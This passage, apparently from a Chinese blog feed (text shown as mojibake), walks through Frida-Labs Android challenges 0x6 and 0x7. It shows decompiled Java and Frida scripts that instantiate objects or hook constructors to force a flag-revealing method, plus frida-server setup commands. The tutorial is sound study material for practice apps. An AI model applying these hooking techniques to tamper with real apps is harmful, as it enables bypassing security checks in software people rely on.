class="hljs-built_in">this</span>.t1 = (TextView) findViewById(R.id.textview);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">get_flag</span><span class="hljs-params">(Checker A)</span> <span class="hljs-keyword">throws</span> NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-number">1234</span> == A.num1 &amp;&amp; <span class="hljs-number">4321</span> == A.num2) &#123;<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>            <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-string">&quot;MySecureKey12345&quot;</span>.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>);<br>            cipher.init(<span class="hljs-number">2</span>, secretKeySpec);<br>            <span class="hljs-type">byte</span>[] decryptedBytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;QQzMj/JNaTblEHnIzgJAQkvWJV2oK9G2/UmrCs85fog=&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">decrypted</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cipher.doFinal(decryptedBytes));<br>            <span class="hljs-built_in">this</span>.t1.setText(decrypted);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Checker ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x6;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Checker</span> &#123;<br>    <span class="hljs-type">int</span> num1;<br>    <span class="hljs-type">int</span> num2;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="MainActivity-ç±»-3"><a href="#MainActivity-ç±»-3" class="headerlink" title="MainActivity ç±»"></a>MainActivity ç±»</h3><p><code>MainActivity</code> ç±»çš„ <code>get_flag()</code> æ–¹æ³•ä¼ å…¥ä¸€ä¸ª <code>Checker</code> å®ä¾‹ï¼Œå½“ <code>num1==1234</code>ä¸” <code>num2==4321</code> æ—¶è·å– flagï¼Œè¿™ä¸ª <code>get_flag()</code> æ–¹æ³•ä¹Ÿå¹¶æ²¡æœ‰è¢«è°ƒç”¨</p><p><img src="https://img.dkdun.cn/v1/2025/12/85032a4bbeb78354.png"></p><h3 id="Checker"><a href="#Checker" class="headerlink" title="Checker"></a>Checker</h3><p>ä¸¤ä¸ªå˜é‡ <code>num1</code> å’Œ <code>num2</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/20b50e74531882b5.png"></p><p>æ‰€ä»¥è§£å†³æ–¹æ³•å°±æ˜¯åˆ›å»º <code>Checker</code> ç±»çš„å®ä¾‹ï¼Œç»™ä¸¤ä¸ªå˜é‡è®¾ç½®å€¼ï¼Œè·å– <code>MainActivity</code> å®ä¾‹ç„¶åå°†å®ä¾‹ä½œä¸ºå‚æ•°è°ƒç”¨ <code>get_flag</code> æ–¹æ³•</p><h2 id="Hook-4"><a href="#Hook-4" class="headerlink" title="Hook"></a>Hook</h2><p>åˆ›å»ºä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„å®ä¾‹ï¼Œä¼ é€’ç»™  <code>get_flag</code> æ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook6</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.ad2001.frida0x6.MainActivity&quot;</span>,&#123;<br><span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">instance</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance);<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Checker</span> =<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x6.Checker&quot;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">CheckerObj</span>=<span class="hljs-title class_">Checker</span>.$new();<br>            <br>            <span class="hljs-comment">//å®ä¾‹åŒ–å¯¹è±¡</span><br><span class="hljs-title class_">CheckerObj</span>.<span class="hljs-property">num1</span>.<span class="hljs-property">value</span>=<span class="hljs-number">1234</span>;<br><span class="hljs-title class_">CheckerObj</span>.<span class="hljs-property">num2</span>.<span class="hljs-property">value</span>=<span class="hljs-number">4321</span>;<br>            <br>instance.<span class="hljs-title function_">get_flag</span>(<span class="hljs-title class_">CheckerObj</span>);<span class="hljs-comment">//è°ƒç”¨ get_flag æ–¹æ³•</span><br>&#125;,<br><span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;endhook&quot;</span>);<br>&#125;<br>&#125;)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title function_">hook6</span>();<br>&#125;)<br>&#125;<br><br><span class="hljs-built_in">setTimeout</span>(main,<span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/0da7e5811ca7f6aa.png"></p><h2 id="Conclusion-4"><a href="#Conclusion-4" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>å¯¹ <code>MainActivity</code> ä¸­éé™æ€æ–¹æ³•ä¸”å‚æ•°ä¸ºéé™æ€å˜é‡è¿›è¡Œå¯¹è±¡å‚æ•°è°ƒç”¨</p><p>Frida ä½¿ç”¨å¯¹è±¡å‚æ•°è°ƒç”¨æ–¹æ³•çš„æ¨¡æ¿ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">performNow</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&#x27;&lt;Package&gt;.&lt;class_Name&gt;&#x27;</span>, &#123;<br>    <span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">instance</span>) &#123;<br>      <span class="hljs-keyword">var</span> &lt;class_reference&gt; = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;&lt;package_name&gt;.&lt;class&gt;&quot;</span>);<br>      <span class="hljs-keyword">var</span> &lt;class_instance&gt; = &lt;class_reference&gt;.$new(); <span class="hljs-comment">// åˆ›å»ºç±»çš„å®ä¾‹</span><br>        <br>      &lt;class_reference&gt;.&lt;variable&gt;.<span class="hljs-property">value</span> = &lt;value&gt;;<span class="hljs-comment">// å®ä¾‹åŒ–å¯¹è±¡</span><br>      <br>      instance.&lt;method&gt;(class_instance); <span class="hljs-comment">// è°ƒç”¨æ–¹æ³•</span><br>    &#125;,<br>    <span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;<br>    <span class="hljs-comment">// å®Œæˆæ“ä½œåçš„å›è°ƒå‡½æ•°</span><br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h1 id="Frida-0x7"><a href="#Frida-0x7" class="headerlink" title="Frida 0x7"></a>Frida 0x7</h1><h2 id="è¿è¡Œ-5"><a href="#è¿è¡Œ-5" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h2><p>ä¾æ—§æ˜¯ä¸€æ ·çš„é™æ€ç•Œé¢</p><p><img src="https://img.dkdun.cn/v1/2025/12/245631b863645523.png"></p><h2 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>MainActivity ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x7;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> java.security.InvalidKeyException;<br><span class="hljs-keyword">import</span> java.security.NoSuchAlgorithmException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javax.crypto.BadPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.IllegalBlockSizeException;<br><span class="hljs-keyword">import</span> javax.crypto.NoSuchPaddingException;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    TextView t1;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-built_in">this</span>.t1 = (TextView) findViewById(R.id.textview);<br>        <span class="hljs-type">Checker</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Checker</span>(<span class="hljs-number">123</span>, <span class="hljs-number">321</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            flag(ch);<br>        &#125; <span class="hljs-keyword">catch</span> (InvalidKeyException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchAlgorithmException e2) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e2);<br>        &#125; <span class="hljs-keyword">catch</span> (BadPaddingException e3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e3);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalBlockSizeException e4) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e4);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchPaddingException e5) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e5);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">flag</span><span class="hljs-params">(Checker A)</span> <span class="hljs-keyword">throws</span> NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException &#123;<br>        <span class="hljs-keyword">if</span> (A.num1 &gt; <span class="hljs-number">512</span> &amp;&amp; <span class="hljs-number">512</span> &lt; A.num2) &#123;<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>            <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(<span class="hljs-string">&quot;MySecureKey12345&quot;</span>.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>);<br>            cipher.init(<span class="hljs-number">2</span>, secretKeySpec);<br>            <span class="hljs-type">byte</span>[] decryptedBytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;cL/bBqDmfO0IXXJCVFwYLeHp1k3mQr+SP6rlQGUPZTY=&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">decrypted</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cipher.doFinal(decryptedBytes));<br>            <span class="hljs-built_in">this</span>.t1.setText(decrypted);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Checker ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ad2001.frida0x7;<br><br><span class="hljs-comment">/* loaded from: classes3.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Checker</span> &#123;<br>    <span class="hljs-type">int</span> num1;<br>    <span class="hljs-type">int</span> num2;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: package-private */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Checker</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>        <span class="hljs-built_in">this</span>.num1 = a;<br>        <span class="hljs-built_in">this</span>.num2 = b;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="MainActivity-ç±»-4"><a href="#MainActivity-ç±»-4" class="headerlink" title="MainActivity ç±»"></a>MainActivity ç±»</h3><p>å…ˆ <code>Checker ch = new Checker(123, 321);</code> åˆ›å»ºäº†ä¸€ä¸ª <code>Checker</code> å®ä¾‹ï¼Œç„¶å <code>Checker</code> ç±»çš„å¯¹è±¡è°ƒç”¨ <code>flag</code> æ–¹æ³•ä¼ å…¥è¯¥å¯¹è±¡ï¼Œä¹‹åå¯¹ <code>num1</code> å’Œ <code>num2</code> çš„ä¸¤ä¸ªå€¼åˆ†åˆ«è¿›è¡Œåˆ¤æ–­ï¼Œä¸¤ä¸ªå‚æ•°å¿…é¡»éƒ½å¤§äº 512</p><p><img src="https://img.dkdun.cn/v1/2025/12/56ea579e5977c8bc.png"></p><h3 id="Checker-ç±»-1"><a href="#Checker-ç±»-1" class="headerlink" title="Checker ç±»"></a>Checker ç±»</h3><p>ä¸¤ä¸ªå˜é‡ <code>num1</code> å’Œ <code>num2</code>ï¼Œé€šè¿‡æ„é€ å‡½æ•°å»èµ‹å€¼</p><p><img src="https://img.dkdun.cn/v1/2025/12/53ce8a3da16591e3.png"></p><h2 id="Hook-5"><a href="#Hook-5" class="headerlink" title="Hook"></a>Hook</h2><h3 id="é€šè¿‡æ„é€ å‡½æ•°ä¼ å‚"><a href="#é€šè¿‡æ„é€ å‡½æ•°ä¼ å‚" class="headerlink" title="é€šè¿‡æ„é€ å‡½æ•°ä¼ å‚"></a>é€šè¿‡æ„é€ å‡½æ•°ä¼ å‚</h3><p>è·Ÿ 0x6 ä¸€æ ·çš„æ­¥éª¤ï¼Œä¸è¿‡è¦é€šè¿‡æ„é€ å‡½æ•°ä¼ å‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook7</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">choose</span>(<span class="hljs-string">&quot;com.ad2001.frida0x7.MainActivity&quot;</span>,&#123;<br><span class="hljs-attr">onMatch</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">instance</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance);<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Checker</span> =<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">CheckerObj</span>=<span class="hljs-title class_">Checker</span>.$new(<span class="hljs-number">520</span>,<span class="hljs-number">520</span>);<span class="hljs-comment">//ç›´æ¥èµ‹å€¼</span><br><br>instance.<span class="hljs-title function_">flag</span>(<span class="hljs-title class_">CheckerObj</span>);<span class="hljs-comment">// hook Checker æ–¹æ³•</span><br>&#125;,<br><span class="hljs-attr">onComplete</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;endhook&quot;</span>);<br>&#125;<br>&#125;)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title function_">hook7</span>();<br>&#125;)<br>&#125;<br><br><span class="hljs-built_in">setTimeout</span>(main,<span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d74a4ac3cfb64e35.png"></p><p>åœ¨å®ä¾‹åŒ–å¯¹è±¡æ—¶æˆ‘ç›´æ¥èµ‹å€¼äº†ï¼Œä¹Ÿå¯ä»¥å…ˆå®ä¾‹åŒ–åèµ‹å€¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-number">520</span>;<br><span class="hljs-keyword">var</span> b = <span class="hljs-number">520</span>;<br><span class="hljs-keyword">var</span> check = checker.$new(a,b);<br>instance.<span class="hljs-title function_">flag</span>(check);<br></code></pre></td></tr></table></figure><h3 id="hook-æ„é€ æ–¹æ³•"><a href="#hook-æ„é€ æ–¹æ³•" class="headerlink" title="hook æ„é€ æ–¹æ³•"></a>hook æ„é€ æ–¹æ³•</h3><p><code>Checker</code> ç±»ä¸­å£°æ˜äº†æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ hook æ„é€ æ–¹æ³•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook7</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Checker</span> =<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);<br><span class="hljs-title class_">Checker</span>.<span class="hljs-property">$init</span>.<span class="hljs-property">implementation</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params">a,b</span>)&#123;<br><span class="hljs-variable language_">this</span>.$init(<span class="hljs-number">520</span>,<span class="hljs-number">520</span>);<br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-title function_">hook7</span>();<br>&#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><h2 id="Conclusion-5"><a href="#Conclusion-5" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Frida Hook æ„é€ æ–¹æ³•çš„æ¨¡æ¿</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> &lt;class_reference&gt; = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;&lt;package_name&gt;.&lt;class&gt;&quot;</span>);<br>  &lt;class_reference&gt;.<span class="hljs-property">$init</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">&lt;args&gt;</span>)&#123;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    è‡ªå®šä¹‰æ–¹æ³•å®ç°</span><br><span class="hljs-comment">    */</span><br><br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
      <category>Frida</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Andriod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é‡ç”Ÿä¹‹æˆ‘è¦æˆä¸º Frida ç³•æ‰‹:Frida-Labs 0x1</title>
    <link href="/2025/03/27/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E8%A6%81%E6%88%90%E4%B8%BA-Frida-%E7%B3%95%E6%89%8B-Frida-Labs-0x1/"/>
    <url>/2025/03/27/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E8%A6%81%E6%88%90%E4%B8%BA-Frida-%E7%B3%95%E6%89%8B-Frida-Labs-0x1/</url>
    
    <content type="html"><![CDATA[<p>ä¸‹åˆçœ‹ SWDD çš„ <a href="https://blog.shangwendada.top/index.php/2024/03/03/fridafrida%e6%93%8d%e4%bd%9c%e6%89%8b%e5%86%8c/">Fridaæ“ä½œæ–¹æ³•æ€»ç»“</a> æ–‡ç« æ—¶è¢«æ¿€èµ·å…´è¶£äº†ï¼Œæ‰€ä»¥å¼€å¹²ï¼</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/DERE-ad2001/Frida-Labs/tree/main">Frida-Labs</a></p><p>ç¬¬ä¸€ä¸ªè¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œæ•´ä½“æµç¨‹ï¼šjeb åç¼–è¯‘ -&gt; ç®€å•ä»£ç å®¡è®¡ -&gt; hook å…³é”®å‡½æ•°</p><span id="more"></span><h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><h2 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h2><p><code>frida</code> å’Œ <code>frida-tools</code> çš„ç‰ˆæœ¬è¦å¯¹åº”ä¸Šï¼Œä¸ç„¶å¯èƒ½ä¼šæŠ¥é”™ï¼Œå¯ä»¥åœ¨ <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a> æ‰¾å¯¹åº”ç‰ˆæœ¬ä¸‹è½½</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">pip list<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/e0aa013913105495.png"></p><h2 id="Frida-server"><a href="#Frida-server" class="headerlink" title="Frida-server"></a>Frida-server</h2><p>å¯åŠ¨ frida-server</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata">adb <span class="hljs-keyword">shell</span><br><span class="hljs-keyword">su</span><br><span class="hljs-keyword">cd</span> data/<span class="hljs-keyword">local</span>/tmp<br><span class="hljs-keyword">ls</span><span class="hljs-comment">// (å¯æœ‰å¯æ— )</span><br>chmod 777 frida~<br>./frida~<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1991be209d3fca01.png"></p><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><p>å…ˆä¸¢è¿›æ¨¡æ‹Ÿå™¨çœ‹çœ‹é•¿ä»€ä¹ˆæ ·</p><p>å½“ä»€ä¹ˆéƒ½ä¸è¾“å…¥å€¼ä¸ºç©ºæ—¶ä¼šç›´æ¥é€€å‡ºç¨‹åº</p><p>å½“è¾“å…¥ <code>111</code> çš„æ—¶å€™ï¼Œæç¤ºäº† ã€Try againã€‘</p><p><img src="https://img.dkdun.cn/v1/2025/12/07ec56c8242a0e05.png"></p><h2 id="Jeb-åç¼–è¯‘"><a href="#Jeb-åç¼–è¯‘" class="headerlink" title="Jeb åç¼–è¯‘"></a>Jeb åç¼–è¯‘</h2><p>ä½¿ç”¨ jeb åç¼–è¯‘åè¿›è¡Œä»£ç å®¡è®¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 